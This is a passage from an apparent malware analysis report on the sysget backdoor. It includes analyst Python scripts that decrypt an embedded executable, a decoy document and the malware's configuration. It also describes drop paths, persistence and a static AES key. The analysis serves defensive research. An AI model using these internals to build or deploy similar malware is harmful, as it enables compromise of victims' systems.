class="crayon-line" id="crayon-5f694c78cc258064108272-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-v">window</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"\x00\x00\x00\x00"</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">output</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-e">window</span></div><div class="crayon-line" id="crayon-5f694c78cc258064108272-17"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">else</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">output</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-st">xor</span><span class="crayon-sy">(</span><span class="crayon-v">window</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">key</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f694c78cc258064108272-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">position</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-e">iteration</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-20"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-v">position</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-e">len</span><span class="crayon-sy">(</span><span class="crayon-v">data</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-v">position</span><span class="crayon-h"> </span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-e">len</span><span class="crayon-sy">(</span><span class="crayon-v">data</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-5f694c78cc258064108272-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">break</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-22"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">output</span></div><div class="crayon-line" id="crayon-5f694c78cc258064108272-23">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-24">&nbsp;</div><div class="crayon-line" id="crayon-5f694c78cc258064108272-25"><span class="crayon-e">def </span><span class="crayon-e">extract</span><span class="crayon-sy">(</span><span class="crayon-v">data</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-26"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">exe_data</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">doc_data</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">None</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">None</span></div><div class="crayon-line" id="crayon-5f694c78cc258064108272-27"><span class="crayon-e">&nbsp;&nbsp;</span><span class="crayon-v">exe_starting_point</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">data</span><span class="crayon-sy">.</span><span class="crayon-e">index</span><span class="crayon-sy">(</span><span class="crayon-s">"\xBA\xBA\xBA\xBA\xBA\xBA"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-cn">6</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-28"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">exe_ending_point</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">None</span></div><div class="crayon-line" id="crayon-5f694c78cc258064108272-29"><span class="crayon-e">&nbsp;&nbsp;</span><span class="crayon-v">ending_points</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">m</span><span class="crayon-sy">.</span><span class="crayon-e">start</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-i">m</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-v">re</span><span class="crayon-sy">.</span><span class="crayon-e">finditer</span><span class="crayon-sy">(</span><span class="crayon-s">"\xBB\xBB\xBB\xBB"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">data</span><span class="crayon-sy">)</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-30"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-i">e</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-v">ending_points</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-5f694c78cc258064108272-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-v">e</span><span class="crayon-h"> </span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-v">exe_starting_point</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">exe_ending_point</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-i">e</span></div><div class="crayon-line" id="crayon-5f694c78cc258064108272-33"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-e">exe_starting_point </span><span class="crayon-st">and</span><span class="crayon-h"> </span><span class="crayon-v">exe_ending_point</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-34"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">mz_data</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">data</span><span class="crayon-sy">[</span><span class="crayon-v">exe_starting_point</span><span class="crayon-o">:</span><span class="crayon-v">exe_ending_point</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5f694c78cc258064108272-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">exe_data</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">decrypt</span><span class="crayon-sy">(</span><span class="crayon-v">mz_data</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"\xBE\xBA\xFE\xCA"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-36"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">else</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-5f694c78cc258064108272-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">raise </span><span class="crayon-e">Exception</span><span class="crayon-sy">(</span><span class="crayon-s">"Unable to find correct offsets for executable."</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-38">&nbsp;</div><div class="crayon-line" id="crayon-5f694c78cc258064108272-39"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">doc_starting_point</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">exe_ending_point</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-cn">4</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-40"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">doc_ending_point</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">None</span></div><div class="crayon-line" id="crayon-5f694c78cc258064108272-41"><span class="crayon-e">&nbsp;&nbsp;</span><span class="crayon-v">ending_points</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">m</span><span class="crayon-sy">.</span><span class="crayon-e">start</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-i">m</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-v">re</span><span class="crayon-sy">.</span><span class="crayon-e">finditer</span><span class="crayon-sy">(</span><span class="crayon-s">"\xBC\xBC\xBC\xBC"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">data</span><span class="crayon-sy">)</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-42"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-i">e</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-v">ending_points</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-5f694c78cc258064108272-43"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-v">e</span><span class="crayon-h"> </span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-v">doc_starting_point</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-44"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">doc_ending_point</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-i">e</span></div><div class="crayon-line" id="crayon-5f694c78cc258064108272-45"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-e">doc_starting_point </span><span class="crayon-st">and</span><span class="crayon-h"> </span><span class="crayon-v">doc_ending_point</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-46"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">doc</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">data</span><span class="crayon-sy">[</span><span class="crayon-v">doc_starting_point</span><span class="crayon-o">:</span><span class="crayon-v">doc_ending_point</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5f694c78cc258064108272-47"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">doc_data</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">decrypt</span><span class="crayon-sy">(</span><span class="crayon-v">doc</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"\x0D\xF0\xAD\xBA"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-48"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">else</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-5f694c78cc258064108272-49"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">raise </span><span class="crayon-e">Exception</span><span class="crayon-sy">(</span><span class="crayon-s">"Unable to find correct offsets for document."</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-50"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">exe_data</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">doc_data</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5f694c78cc258064108272-51">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-52">&nbsp;</div><div class="crayon-line" id="crayon-5f694c78cc258064108272-53"><span class="crayon-e">def </span><span class="crayon-e">main</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-54"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">input_file</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">sys</span><span class="crayon-sy">.</span><span class="crayon-v">argv</span><span class="crayon-sy">[</span><span class="crayon-cn">1</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5f694c78cc258064108272-55"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">input_fh</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">open</span><span class="crayon-sy">(</span><span class="crayon-v">input_file</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'rb'</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-56"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">input_data</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">input_fh</span><span class="crayon-sy">.</span><span class="crayon-e">read</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f694c78cc258064108272-57"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">input_fh</span><span class="crayon-sy">.</span><span class="crayon-e">close</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-58"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">exe</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">doc</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">extract</span><span class="crayon-sy">(</span><span class="crayon-v">input_data</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f694c78cc258064108272-59">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-60"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">filename</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"{}.exe"</span><span class="crayon-sy">.</span><span class="crayon-e">format</span><span class="crayon-sy">(</span><span class="crayon-v">input_file</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f694c78cc258064108272-61"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">output_file</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">open</span><span class="crayon-sy">(</span><span class="crayon-v">filename</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'wb'</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-62"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">output_file</span><span class="crayon-sy">.</span><span class="crayon-e">write</span><span class="crayon-sy">(</span><span class="crayon-v">exe</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f694c78cc258064108272-63"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">output_file</span><span class="crayon-sy">.</span><span class="crayon-e">close</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-64"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-i">print</span><span class="crayon-h"> </span><span class="crayon-s">"[+] Wrote {}"</span><span class="crayon-sy">.</span><span class="crayon-e">format</span><span class="crayon-sy">(</span><span class="crayon-v">filename</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f694c78cc258064108272-65">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-66"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">filename</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"{}.doc"</span><span class="crayon-sy">.</span><span class="crayon-e">format</span><span class="crayon-sy">(</span><span class="crayon-v">input_file</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f694c78cc258064108272-67"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">output_file</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">open</span><span class="crayon-sy">(</span><span class="crayon-v">filename</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'wb'</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-68"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">output_file</span><span class="crayon-sy">.</span><span class="crayon-e">write</span><span class="crayon-sy">(</span><span class="crayon-v">doc</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f694c78cc258064108272-69"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">output_file</span><span class="crayon-sy">.</span><span class="crayon-e">close</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-70"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-i">print</span><span class="crayon-h"> </span><span class="crayon-s">"[+] Wrote {}"</span><span class="crayon-sy">.</span><span class="crayon-e">format</span><span class="crayon-sy">(</span><span class="crayon-v">filename</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f694c78cc258064108272-71">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-72">&nbsp;</div><div class="crayon-line" id="crayon-5f694c78cc258064108272-73"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-e">len</span><span class="crayon-sy">(</span><span class="crayon-v">sys</span><span class="crayon-sy">.</span><span class="crayon-v">argv</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-h"> </span><span class="crayon-st">and</span><span class="crayon-h"> </span><span class="crayon-v">__name__</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"__main__"</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc258064108272-74"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-e">main</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0064 seconds] -->
<p>When both files are decrypted, they are written to the following location in the %TEMP% directory:</p>
<ul>
<li>../..exe</li>
<li>../..doc</li>
</ul>
<p>Note the initial ‘..’, which represents the parent directory of %TEMP%. This coupled with the unusual names of ..exe and ..doc make this particular shellcode very unique, which is one way we have attributed these samples to the same group. After the samples have been written, they are executed via calls to WinExec.</p>
<h3>Sysget v2 Analysis</h3>
<p>One of the fundamental changes witnessed in the second iteration of sysget is removing support for Windows XP and lower. Other changes include modifications to the URIs used for network communication.</p>
<p>Like the original version of sysget, sysget v2 still uses a named event of ‘mcsong[]’ to ensure a single instance is running at a time. It proceeds to make attempts at copying itself to the %STARTUP%/notilv.exe path. However, it uses COM objects to perform this action that is not available in Windows XP, which prevents the malware from installing itself to this location. While the remainder of the malware operates as expected, it will not survive a restart of the system.</p>
<p>Sysget proceeds to make an attempt at reading the following configuration file. This filename and path has changed since the original version, and is consistent in the subsequent versions.</p>
<ul>
<li>%APPDATA%/vklCen5.tmp</li>
</ul>
<p>This configuration file holds both a unique victim identifier, as well as a key that is used to encrypt HTTP traffic. It is encrypted using the AES-128 encryption algorithm, using a static key of ‘734thfg9ih’. Using AES-128 is a change from the previous version, where RC4 was used for all encryption operations. The following Python code may be used to decrypt this file:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c78cc265157341142" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
import sys
import base64
from wincrypto import CryptCreateHash, CryptHashData, CryptDeriveKey, CryptDecrypt

def decrypt(data, original_key):
	CALG_AES_128 = 0x660E
	CALG_MD5 = 0x8003
	md5_hasher = CryptCreateHash(CALG_MD5)
	CryptHashData(md5_hasher, original_key)
	key = CryptDeriveKey(md5_hasher, CALG_AES_128)
	decrypted_data = CryptDecrypt(key, data)
	return decrypted_data

arg = open(sys.argv[1], 'rb').read()
print repr(decrypt(arg, '734thfg9ih'))</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c78cc265157341142-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc265157341142-2">2</div><div class="crayon-num" data-line="crayon-5f694c78cc265157341142-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc265157341142-4">4</div><div class="crayon-num" data-line="crayon-5f694c78cc265157341142-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc265157341142-6">6</div><div class="crayon-num" data-line="crayon-5f694c78cc265157341142-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc265157341142-8">8</div><div class="crayon-num" data-line="crayon-5f694c78cc265157341142-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc265157341142-10">10</div><div class="crayon-num" data-line="crayon-5f694c78cc265157341142-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc265157341142-12">12</div><div class="crayon-num" data-line="crayon-5f694c78cc265157341142-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc265157341142-14">14</div><div class="crayon-num" data-line="crayon-5f694c78cc265157341142-15">15</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c78cc265157341142-1"><span class="crayon-e">import </span><span class="crayon-e">sys</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc265157341142-2"><span class="crayon-e">import </span><span class="crayon-e">base64</span></div><div class="crayon-line" id="crayon-5f694c78cc265157341142-3"><span class="crayon-e">from </span><span class="crayon-e">wincrypto </span><span class="crayon-e">import </span><span class="crayon-v">CryptCreateHash</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">CryptHashData</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">CryptDeriveKey</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">CryptDecrypt</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc265157341142-4">&nbsp;</div><div class="crayon-line" id="crayon-5f694c78cc265157341142-5"><span class="crayon-e">def </span><span class="crayon-e">decrypt</span><span class="crayon-sy">(</span><span class="crayon-v">data</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">original_key</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc265157341142-6"><span class="crayon-h">	</span><span class="crayon-v">CALG_AES_128</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x660E</span></div><div class="crayon-line" id="crayon-5f694c78cc265157341142-7"><span class="crayon-h">	</span><span class="crayon-v">CALG_MD5</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x8003</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc265157341142-8"><span class="crayon-h">	</span><span class="crayon-v">md5_hasher</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">CryptCreateHash</span><span class="crayon-sy">(</span><span class="crayon-v">CALG_MD5</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f694c78cc265157341142-9"><span class="crayon-h">	</span><span class="crayon-e">CryptHashData</span><span class="crayon-sy">(</span><span class="crayon-v">md5_hasher</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">original_key</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc265157341142-10"><span class="crayon-h">	</span><span class="crayon-v">key</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">CryptDeriveKey</span><span class="crayon-sy">(</span><span class="crayon-v">md5_hasher</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">CALG_AES_128</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f694c78cc265157341142-11"><span class="crayon-h">	</span><span class="crayon-v">decrypted_data</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">CryptDecrypt</span><span class="crayon-sy">(</span><span class="crayon-v">key</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">data</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc265157341142-12"><span class="crayon-h">	</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">decrypted_data</span></div><div class="crayon-line" id="crayon-5f694c78cc265157341142-13">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc265157341142-14"><span class="crayon-v">arg</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">open</span><span class="crayon-sy">(</span><span class="crayon-v">sys</span><span class="crayon-sy">.</span><span class="crayon-v">argv</span><span class="crayon-sy">[</span><span class="crayon-cn">1</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'rb'</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">read</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f694c78cc265157341142-15"><span class="crayon-e">print </span><span class="crayon-e">repr</span><span class="crayon-sy">(</span><span class="crayon-e">decrypt</span><span class="crayon-sy">(</span><span class="crayon-v">arg</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'734thfg9ih'</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0013 seconds] -->
<p>When executed against an example configuration file, we see the following output, which includes the two pieces of data noted previously:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c78cc267291240254" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
